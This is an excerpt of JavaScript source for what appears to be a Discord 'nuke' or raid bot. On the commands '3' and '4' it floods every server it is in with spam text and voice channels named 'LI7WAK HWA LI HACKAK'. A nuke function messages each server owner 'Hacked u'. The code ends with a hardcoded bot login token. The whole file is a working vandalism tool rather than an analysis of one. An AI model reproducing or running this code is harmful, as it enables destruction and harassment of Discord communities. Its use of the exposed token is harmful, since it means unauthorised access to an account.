...
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  AYMAN " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
...
LOka.on('message', message => {
         if (message.content === "3") {
               LOka.guilds.forEach(m =>{
m.createChannel('LI7WAK HWA LI HACKAK', 'text');
m.createChannel('LI7WAK HWA LI HACKAK', 'text');
m.createChannel('LI7WAK HWA LI HACKAK', 'text');
m.createChannel('LI7WAK HWA LI HACKAK', 'text');
m.createChannel('LI7WAK HWA LI HACKAK', 'text');
...
LOka.on('message', message => {
         if (message.content === "4") {
                 LOka.guilds.forEach(m =>{
m.createChannel('LI7WAK HAKAK', 'voice');
m.createChannel('LI7WAK HAKAK', 'voice');
m.createChannel('LI7WAK HAKAK', 'voice');
m.createChannel('LI7WAK HAKAK', 'voice');
m.createChannel('LI7WAK HAKAK', 'voice');
...
async function nuke(guild) {
  ...
  await guild.owner.send(' Hacked u by unknown Is here    تم الحوا بنجاح').catch(e => { return void e; });
...
LOka.login("NTg5MTQ1MzM1NDgyNDE3MTU1.XQPbaw.LmtyxyiXEj1KgDGxwi0-EXbQ6KY")
